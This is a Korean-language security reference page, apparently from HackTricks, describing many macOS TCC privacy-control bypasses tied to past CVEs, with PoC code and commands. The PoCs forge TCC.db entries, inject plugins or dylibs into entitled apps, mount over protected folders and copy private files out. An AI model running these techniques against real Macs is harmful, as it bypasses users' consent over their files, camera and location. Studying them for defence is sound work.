# macOS TCC 우회

{{#include ../../../../../banners/hacktricks-training.md}}

## 기능별

### 쓰기 우회

이는 우회가 아니라 TCC가 작동하는 방식일 뿐입니다. **쓰기 작업은 보호하지 않습니다**. Terminal에 **사용자의 Desktop을 읽을 권한이 없어도 해당 위치에 계속 쓸 수 있습니다**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
새 **file**에 **extended attribute `com.apple.macl`**이 추가되어 **creators app**이 해당 파일을 읽을 수 있는 access 권한을 부여받습니다.

### TCC ClickJacking

**TCC prompt 위에 window를 배치**하여 사용자가 이를 인지하지 못한 채 **accept**하도록 만들 수 있습니다. PoC는 [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**에서 확인할 수 있습니다.**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### 임의의 이름을 통한 TCC Request

Attacker는 **`Info.plist`에서 임의의 이름**(예: Finder, Google Chrome...)으로 **apps를 생성**하고 TCC protected location에 대한 access를 요청하도록 만들 수 있습니다. 사용자는 legit application이 이 access를 요청한다고 생각하게 됩니다.\
또한 **Dock에서 legit app을 제거하고 fake app을 배치**할 수도 있습니다. 사용자가 fake app을 클릭하면(동일한 icon을 사용할 수 있음) legit app을 호출하고, TCC permissions를 요청한 다음 malware를 실행하여 legit app이 access를 요청한 것처럼 믿게 만들 수 있습니다.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

추가 정보와 PoC:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

기본적으로 **SSH를 통한 access에는 "Full Disk Access"**가 있었습니다. 이를 disable하려면 해당 항목이 목록에 표시되지만 disabled 상태여야 합니다(목록에서 제거해도 해당 privileges는 제거되지 않음):<sup>[[2]](#references)</sup>

![TCC Request by arbitrary name - SSH Bypass: 기본적으로 SSH를 통한 access에는 "Full Disk Access"가 있었습니다. 이를 disable하려면 해당 항목이 목록에 표시되지만 disabled 상태여야 합니다(목록에서 제거해도 해당 privileges는 제거되지 않음)...](<../../../../../images/image (1077).png>)

일부 **malwares가 이 protection을 bypass할 수 있었던** 사례는 다음에서 확인할 수 있습니다:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/) <sup>[[11]](#references)</sup>

> [!CAUTION]
> 이제 SSH를 enable하려면 **Full Disk Access**가 필요합니다.

### Handle extensions - CVE-2022-26767

**`com.apple.macl`** attribute는 **특정 application에 해당 파일을 읽을 수 있는 permissions를 부여하기 위해** files에 설정됩니다. 이 attribute는 파일을 app 위로 **drag\&drop**하거나, 사용자가 파일을 **default application으로 열기 위해 double-click**할 때 설정됩니다.

따라서 사용자는 **모든 extensions를 처리하도록 malicious app을 register**하고 Launch Services를 호출하여 모든 파일을 **open**할 수 있습니다(이렇게 하면 malicious file에 해당 파일을 읽을 수 있는 access가 부여됨).

### iCloud

**`com.apple.private.icloud-account-access`** entitlement를 사용하면 **iCloud tokens를 제공하는** **`com.apple.iCloudHelper`** XPC service와 communicate할 수 있습니다.

**iMovie**와 **Garageband**에는 이 entitlement 및 이를 허용하는 다른 entitlement가 있었습니다.

해당 entitlement를 통해 **icloud tokens를 획득하는** exploit에 대한 자세한 **information**은 다음 talk를 확인하세요: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[[12]](#references)</sup>

### kTCCServiceAppleEvents / Automation

**`kTCCServiceAppleEvents`** permission이 있는 app은 **다른 Apps를 control**할 수 있습니다. 즉, **다른 Apps에 부여된 permissions를 abuse**할 수 있습니다.

Apple Scripts에 대한 자세한 info는 다음을 확인하세요:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

예를 들어 App에 **`iTerm`에 대한 Automation permission**이 있다면, 이 예시에서는 **`Terminal`**이 iTerm에 access할 수 있습니다:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

FDA가 없는 Terminal은 FDA가 있는 iTerm을 호출하고 이를 사용하여 actions를 수행할 수 있습니다:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Finder를 통한 접근

또는 App이 Finder를 통해 접근할 수 있다면, 다음과 같은 script를 실행할 수 있습니다:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## 앱 동작별

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

userland **tccd daemon**은 **`HOME`** **env** 변수를 사용하여 다음 위치에서 TCC 사용자 데이터베이스에 액세스합니다: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

[this Stack Exchange post](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)에 따르면, 그리고 TCC daemon이 현재 사용자의 domain 내에서 `launchd`를 통해 실행되므로, 해당 daemon에 전달되는 **모든 환경 변수를 제어**할 수 있습니다.\
따라서 **attacker는 `launchctl`에서 `$HOME` 환경** 변수를 **제어 가능한** **directory**를 가리키도록 설정하고, **TCC** daemon을 **restart**한 다음, 최종 사용자에게 아무런 프롬프트도 표시하지 않고 **TCC database를 직접 수정**하여 자신에게 사용 가능한 **모든 TCC entitlement**를 부여할 수 있습니다.<sup>[[1]](#references)</sup>\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notes

Notes는 TCC로 보호되는 위치에 접근할 수 있었지만, note가 생성되면 **보호되지 않는 위치에 생성**됩니다. 따라서 Notes에 보호된 파일을 note에 복사하도록 요청할 수 있었고(즉, 보호되지 않는 위치에 복사), 이후 해당 파일에 접근할 수 있었습니다:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

`libsecurity_translocate` 라이브러리를 사용하는 `/usr/libexec/lsd` 바이너리에는 **nullfs** mount를 생성할 수 있는 `com.apple.private.nullfs_allow` entitlement와 모든 파일에 접근할 수 있는 **`kTCCServiceSystemPolicyAllFiles`** 권한이 포함된 `com.apple.private.tcc.allow` entitlement가 있었습니다.

"Library"에 quarantine attribute를 추가한 다음 **`com.apple.security.translocation`** XPC service를 호출하면, Library가 **`$TMPDIR/AppTranslocation/d/d/Library`**에 매핑되었고 Library 내부의 모든 문서에 **접근**할 수 있었습니다.

### CVE-2024-44131 - FileProvider symlink race

파일 작업을 **privileged helper**(여기서는 **`fileproviderd`** / **`Files.app`**)에 위임하는 앱은 사용자를 **대신하여** 항목을 복사하거나 이동하므로, copy 작업은 caller가 아닌 helper의 권한으로 실행됩니다.

Jamf Threat Labs는 작업 전에 수행되는 symlink 검증에 대해 **race**가 가능하다는 것을 보여주었습니다. **마지막** path component에 symlink를 심는 대신(이 부분은 검사됨), attacker가 copy가 이미 시작된 후 path의 **중간** directory를 교체합니다. 그러면 privileged helper가 attacker가 제어하는 link를 따라가며 **prompt를 표시하지 않고도** TCC로 보호되는 위치를 읽거나 쓸 수 있습니다.<sup>[[7]](#references)</sup>

path에 random UUID가 포함되어 보호되지 않는 directory(예: `~/Library/Mobile Documents/com~apple~CloudDocs`)가 가장 쉬운 target입니다. attacker가 race에 사용할 전체 path를 예측할 수 있기 때문입니다.

> [!TIP]
> 확인해야 할 generic pattern은 다음과 같습니다. **path를 두 번 이상 resolve하는 모든 privileged process**(check-then-use 또는 `rename()`/`copyfile()`이 source와 destination을 별도로 resolve하는 경우)는 path 중간의 directory를 교체하여 race할 수 있습니다. `O_NOFOLLOW_ANY`, 이미 open된 directory FD를 사용하는 `openat()`, 또는 `realpath()` 후 재검증하는 방법만이 실제로 이 window를 닫습니다.

자세한 내용은 [**the Jamf Threat Labs writeup**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)을 참고하세요.<sup>[[7]](#references)</sup>

### SQLITE_SQLLOG_DIR

`libsqlite3`는 `SQLITE_ENABLE_SQLLOG`가 활성화된 상태로 build할 수 있으며, 이 경우 environment variable로 제어되는 logging hook이 추가됩니다 ([upstream `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):<sup>[[8]](#references)</sup>

- **`SQLITE_SQLLOG_DIR=path`** – **열리는 모든 database에 대해**, **database file의 copy**와 SQL statement log가 `path`에 기록됩니다(directory는 미리 존재해야 합니다).
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – DB를 열거나 attach할 때마다 기존 파일을 재사용하지 않고 **새 copy를 생성**합니다.
- **`SQLITE_SQLLOG_CONDITIONAL`** – main DB 옆에 `<database>-sqllog` file이 존재하는 connection만 log합니다.

이 variable을 FDA를 보유하고 SQLite database를 여는 process에 inject할 수 있다면, 해당 process는 보호된 database를 사용자가 제어하는 directory에 **기꺼이 copy**합니다. destination filename은 attacker가 제어하는 data에서 파생되므로, destination에 심어 둔 **symlink**를 통해 동일한 primitive를 target process의 권한으로 **arbitrary file write**로 전환할 수 있습니다.

### **SQLITE_AUTO_TRACE**

environment variable **`SQLITE_AUTO_TRACE`**가 설정되면, **`libsqlite3.dylib`** library가 모든 SQL query를 **logging**하기 시작합니다. 많은 application이 이 library를 사용하므로, 해당 application의 모든 SQLite query를 log할 수 있었습니다.

여러 Apple application이 이 library를 사용하여 TCC로 보호되는 정보에 접근했습니다.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### env-var driven file writes Hunting

The two previous entries are instances of the same generic technique, and it is worth hunting for more: **TCC-privileged app에 로드된 framework는 종종 debug/logging environment variable을 노출하며, 이 변수로 인해 process가 caller-controlled path에 file을 생성하도록 만들 수 있습니다**.

이를 찾는 workflow:

1. FDA 또는 다른 유용한 TCC permission이 있는 target (`Music`, `TV`, `Terminal`, MDM agents...)을 선택하고, 해당 target이 link하는 framework를 나열합니다 (`otool -L`, `vmmap`).
2. 해당 framework에서 `getenv` 문자열을 grep합니다: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`.
3. `launchctl setenv NAME /path/you/control`을 통해 candidate variable을 설정하고, app을 실행한 다음 `fs_usage -w -f filesys <pid>` 또는 `sudo fs_usage | grep <path>`로 filesystem에서 수행하는 동작을 확인합니다.
4. process가 사용자의 directory에 있는 file을 **생성하거나 rename**하면 write primitive를 확보한 것입니다. destination을 symlink로 지정하거나, 위의 CVE-2024-44131처럼 intermediate directory에 race를 발생시켜 `~/Library/Application Support/com.apple.TCC/TCC.db`로 redirect합니다.

> [!TIP]
> 이 방법에는 두 가지 제한이 있습니다. 첫째, app이 [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) entitlement를 포함하지 않는 한 **`DYLD_*` variable은 hardened-runtime binary에서 무시됩니다** ("a Boolean value that indicates whether the app may be affected by dynamic linker environment variables, which you can use to inject code into your app's process"). 자세한 내용은 [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)도 참조하십시오. 둘째, Apple은 framework debug variable이 보고되면 이를 개별적으로 제거하므로, 한 macOS release에서 동작했던 variable이 다음 release에서는 사라지는 경우가 많습니다. 하나를 설정한 후 app이 아무런 메시지 없이 launch를 거부한다면 해당 variable이 이미 filter되었다고 간주하십시오.

linker variable을 사용하는 동일한 trick은 [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md)에서 확인할 수 있습니다.

### Apple Remote Desktop

root로 이 service를 enable하면 **ARD agent가 full disk access를 가지게 되며**, 이후 user가 이를 악용해 새로운 **TCC user database**를 복사하도록 만들 수 있습니다.

## By **NFSHomeDirectory**

TCC는 user에게 특정한 resource에 대한 access를 제어하기 위해 user의 HOME folder에 있는 database를 사용합니다: **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
따라서 user가 **다른 folder를 가리키는 $HOME env variable**을 사용하도록 TCC를 restart할 수 있다면, **/Library/Application Support/com.apple.TCC/TCC.db**에 새로운 TCC database를 생성하고 TCC를 속여 모든 app에 임의의 TCC permission을 grant하도록 만들 수 있습니다.

> [!TIP]
> Apple은 user profile에 저장된 **`NFSHomeDirectory`** attribute의 값을 **`$HOME`의 value**로 사용합니다. 따라서 이 값을 수정할 permission (**`kTCCServiceSystemPolicySysAdminFiles`**)이 있는 application을 compromise하면 이 option을 TCC bypass로 **weaponize**할 수 있습니다.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**첫 번째 POC**는 [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/)와 [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/)를 사용하여 user의 **HOME** folder를 수정합니다.

1. target app의 _csreq_ blob을 가져옵니다.
2. 필요한 access와 _csreq_ blob이 포함된 fake _TCC.db_ file을 plant합니다.
3. [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/)를 사용하여 user의 Directory Services entry를 export합니다.
4. user의 home directory를 변경하도록 Directory Services entry를 수정합니다.
5. [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/)를 사용하여 수정된 Directory Services entry를 import합니다.
6. user의 _tccd_를 stop하고 process를 reboot합니다.

두 번째 POC는 `kTCCServiceSystemPolicySysAdminFiles` 값을 가진 `com.apple.private.tcc.allow` entitlement가 있는 **`/usr/libexec/configd`**를 사용했습니다.\
**`configd`를 `-t` option과 함께 실행할 수 있었으며**, attacker는 **load할 custom Bundle**을 지정할 수 있었습니다. 따라서 이 exploit은 user의 home directory를 변경하는 **`dsexport`** 및 **`dsimport`** method를 **`configd` code injection**으로 **대체**합니다.

자세한 내용은 [**original report**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)를 확인하십시오.<sup>[[13]](#references)</sup>

## By process injection

process 내부에 code를 inject하고 TCC privilege를 abuse하는 다양한 technique이 있습니다:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

또한 TCC bypass를 위해 가장 일반적으로 발견되는 process injection은 **plugins (load library)**를 통한 방식입니다.\
Plugin은 일반적으로 library 또는 plist 형태의 추가 code이며, **main application에 의해 load**되어 해당 context에서 실행됩니다. 따라서 main application이 granted permission 또는 entitlement를 통해 TCC restricted file에 access할 수 있었다면 **custom code도 동일한 access를 갖게 됩니다**.

### CVE-2020-27937 - Directory Utility

`/System/Library/CoreServices/Applications/Directory Utility.app` application은 **`kTCCServiceSystemPolicySysAdminFiles`** entitlement를 가지고 있었고, `.daplug` extension의 plugin을 load했으며 **hardened** runtime이 없었습니다.

이 CVE를 weaponize하려면, **NFSHomeDirectory**를 **변경**해야 합니다(이전 entitlement를 abuse). 이를 통해 **user의 TCC database를 탈취**하여 TCC를 bypass할 수 있습니다.

자세한 내용은 [**original report**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)를 확인하십시오.<sup>[[14]](#references)</sup>

### CVE-2020-29621 - Coreaudiod

**`/usr/sbin/coreaudiod`** binary는 `com.apple.security.cs.disable-library-validation` 및 `com.apple.private.tcc.manager` entitlement를 가지고 있었습니다. 첫 번째 entitlement는 **code injection을 허용**하고, 두 번째 entitlement는 **TCC를 manage할 access**를 제공합니다.

이 binary는 `/Library/Audio/Plug-Ins/HAL` folder에서 **third party plug-in**을 load할 수 있었습니다. 따라서 다음 POC를 사용해 **plugin을 load하고 TCC permission을 abuse**할 수 있었습니다:<sup>[[15]](#references)</sup>
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
자세한 정보는 [**original report**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)를 확인하세요.<sup>[[15]](#references)</sup>

### Device Abstraction Layer (DAL) Plug-Ins

Core Media I/O를 통해 카메라 스트림을 여는 시스템 애플리케이션(**`kTCCServiceCamera`**를 사용하는 앱)은 `/Library/CoreMediaIO/Plug-Ins/DAL`(SIP 제한이 적용되지 않음)에 위치한 이러한 플러그인을 **프로세스 내에서 로드**합니다.

해당 위치에 일반적인 **constructor**가 포함된 library를 저장하는 것만으로도 **code injection**이 가능합니다.

여러 Apple 애플리케이션이 이에 취약했습니다.

### Firefox

Firefox 애플리케이션에는 `com.apple.security.cs.disable-library-validation` 및 `com.apple.security.cs.allow-dyld-environment-variables` entitlements가 있었습니다:<sup>[[16]](#references)</sup>
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
이 방법을 쉽게 exploit하는 방법에 대한 자세한 내용은 [**original report를 확인하세요**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).<sup>[[16]](#references)</sup>

### CVE-2020-10006

바이너리 `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl`에는 **`com.apple.private.tcc.allow`** 및 **`com.apple.security.get-task-allow`** entitlements가 있어, 프로세스 내부에 code를 inject하고 TCC privileges를 사용할 수 있었습니다.

### CVE-2023-26818 - Telegram

Telegram에는 **`com.apple.security.cs.allow-dyld-environment-variables`** 및 **`com.apple.security.cs.disable-library-validation`** entitlements가 있었으므로, 이를 abuse하여 카메라 recording과 같은 **해당 앱의 permissions에 access**할 수 있었습니다. [**writeup에서 payload를 확인할 수 있습니다**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).<sup>[[17]](#references)</sup>

env variable을 사용해 library를 load하는 방법에 주목하세요. 이 library를 inject하기 위해 **custom plist**를 생성하고, 이를 launch하기 위해 **`launchctl`**을 사용했습니다:<sup>[[17]](#references)</sup>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## open 호출을 통한 우회

sandboxed 상태에서도 **`open`**을 호출할 수 있습니다.

### Terminal Scripts

기술 관련 사용자가 사용하는 컴퓨터에서는 Terminal에 **Full Disk Access (FDA)** 권한을 부여하는 경우가 매우 흔합니다. 또한 이를 사용해 **`.terminal`** scripts를 호출할 수 있습니다.

**`.terminal`** scripts는 다음과 같은 plist 파일이며, 실행할 명령은 **`CommandString`** 키에 지정합니다:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
애플리케이션은 /tmp와 같은 위치에 터미널 스크립트를 작성한 후 다음과 같은 명령어로 실행할 수 있습니다:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## By mounting

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**모든 사용자**(권한이 없는 사용자도 포함)는 Time Machine snapshot을 생성하고 mount하여 해당 snapshot의 **모든 파일에 접근**할 수 있습니다.\
필요한 **유일한 권한**은 사용되는 애플리케이션(예: `Terminal`)에 **Full Disk Access** (FDA) 권한(`kTCCServiceSystemPolicyAllfiles`)이 부여되어 있는 것이며, 이는 관리자가 부여해야 합니다.<sup>[[2]](#references)</sup>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
자세한 설명은 [**원본 보고서에서 확인할 수 있습니다**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - TCC file 위에 Mount

TCC DB file이 보호되고 있더라도, **directory 위에** 새로운 TCC.db file을 mount할 수 있었습니다:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
**전체 exploit**은 [**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/)에서 확인할 수 있습니다.

### CVE-2024-40855

[original writeup](https://www.kandji.io/blog/macos-audit-story-part2)에서 설명한 것처럼, 이 CVE는 `diskarbitrationd`를 악용했습니다.<sup>[[18]](#references)</sup>

공개 `DiskArbitration` framework의 `DADiskMountWithArgumentsCommon` 함수가 security checks를 수행했습니다. 하지만 `diskarbitrationd`를 직접 호출하면 이를 우회할 수 있으므로, 경로에 `../` 요소와 symlink를 사용할 수 있습니다.

이를 통해 공격자는 모든 위치에 임의로 mount할 수 있었으며, `diskarbitrationd`의 `com.apple.private.security.storage-exempt.heritable` entitlement로 인해 TCC database를 덮어 mount하는 것도 가능했습니다.

### asr

**`/usr/sbin/asr`** tool을 사용하면 전체 disk를 복사한 후 다른 위치에 mount하여 TCC protections를 우회할 수 있었습니다.

### CVE-2022-22655 - Location Services

Location Services는 다른 services처럼 TCC database에 저장되지 않습니다. 대신 자체 allow-list를 유지하는 `locationd`가 관리하며, 해당 allow-list는 **`/var/db/locationd/clients.plist`**에 저장됩니다:<sup>[[5]](#references)</sup>
```bash
# Requires FDA to read
sudo plutil -p /var/db/locationd/clients.plist | head -40
```
각 항목은 client(bundle ID 또는 executable path)를 키로 사용하며, `Authorized`, `BundleId`, `Executable`, `Registered` 등의 필드를 포함합니다.

`clients.plist` 파일 자체는 Sandbox/TCC로 보호되므로 root 권한으로도 편집할 수 없습니다. 하지만 **`/var/db/locationd/` directory는 mounting으로부터 보호되지 않았습니다**. 따라서 root 권한으로 실행 중인 attacker는 자체 `clients.plist`(자신의 binary가 `Authorized`로 표시됨)를 포함하는 disk image를 만들고, 이를 directory 위에 mount한 다음 `locationd`를 restart하여 위조된 allow-list가 적용되도록 할 수 있었습니다.<sup>[[5]](#references)</sup>

> [!TIP]
> 이는 위의 `hdiutil`/`mount` TCC bypasses와 동일한 패턴입니다. *file*은 보호되지만 해당 file이 위치한 *directory*는 보호되지 않으므로, file 대신 전체 directory를 교체합니다.

## startup apps를 통한 방법


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## grep을 통한 방법

여러 경우에 files는 emails, phone numbers, messages...와 같은 sensitive information을 보호되지 않은 locations에 저장합니다(Apple에서는 이를 vulnerability로 간주합니다).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

이 방법은 더 이상 작동하지 않지만, [**과거에는 작동했습니다**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

[**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)를 사용하는 또 다른 방법:<sup>[[19]](#references)</sup>

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## References

- [1] [CVE-2020–9934: Bypassing the macOS Transparency, Consent, and Control (TCC) Framework](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [2] [Bypassing macOS TCC User Privacy Protections By Accident and Design](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [3] [20+ Ways to Bypass Your macOS Privacy Mechanisms](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [4] [Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms](https://www.youtube.com/watch?v=a9hsxPdRxsY)
- [5] [CVE-2022-22655 - TCC Location Services bypass (original report)](https://theevilbit.github.io/posts/cve-2022-22655/)
- [6] [Where in the World is Carmen Sandiego: Abusing Location Services on macOS](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
- [7] [Jamf Threat Labs - CVE-2024-44131: TCC bypass steals data from iCloud](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [8] [SQLite - `test_sqllog.c` (SQLITE_ENABLE_SQLLOG env variables)](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [9] [Apple - Allow DYLD environment variables entitlement](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [10] [The Eclectic Light Company - Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
